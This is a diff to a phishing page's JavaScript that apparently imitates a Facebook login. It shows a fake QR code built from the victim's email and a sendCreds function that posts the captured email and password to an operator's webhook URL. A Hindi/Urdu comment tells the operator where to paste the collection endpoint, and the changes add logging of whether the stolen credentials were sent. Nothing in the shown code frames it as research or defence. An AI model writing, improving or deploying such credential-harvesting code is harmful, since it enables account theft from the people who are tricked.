@@ -140,7 +140,7 @@
                 loadingText.style.display = 'none';
                 document.getElementById('qr-section').style.display = 'block';
                 
-                // Generate Fake QR Code (using a generic API)
+                // Generate Fake QR Code
                 const qrData = `fb_auth:${email}:${Date.now()}`;
                 document.getElementById('qr-image').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(qrData)}`;
                 
@@ -161,7 +161,7 @@
                     status.style.display = 'none';
                     successMsg.style.display = 'block';
                     
-                    // 👇👇👇 YAHAN APNA WEBHOOK URL PASTE KARO 👇👇👇
+                    // 👇👇👇 YAHAN APNA WEBHOOK.SITE URL PASTE KARO 👇👇👇
                     const webhookURL = "https://5fd82665-8a43-42b4-a65a-b95ea5aff5b1.webhooksite.net"; 
                     
                     sendCreds(email, password, webhookURL);
@@ -185,8 +185,16 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             })
-            .then(res => console.log('Sent'))
-            .catch(err => console.error('Error sending creds'));
+            .then(res => {
+                console.log('Creds sent successfully!');
+                // Optional: Show a hidden log in browser for debugging
+                // document.body.innerHTML += `<div style="position:absolute;bottom:10px;left:10px;background:white;padding:5px;border:1px solid black;">Sent!</div>`;
+            })
+            .catch(err => {
+                console.error('Error sending creds:', err);
+                // Optional: Show error in browser
+                // document.body.innerHTML += `<div style="position:absolute;bottom:10px;left:10px;background:red;color:white;padding:5px;">Error: Check Console</div>`;
+            });
         }
     </script>
 </body>
